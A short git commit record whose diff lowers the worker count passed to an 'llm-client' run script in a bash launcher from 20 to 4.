abf0ae1bc564c9914c2e5a183df7dcc86d0c8dbe
gaserjuk <gaserjukilo@gmail.com>
2026-06-16 19:32:09 +0700

    Update bas.sh

--- bas.sh
+++ bas.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 20 worker00
+cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 4 worker00
 sleep 10
 while true
 do
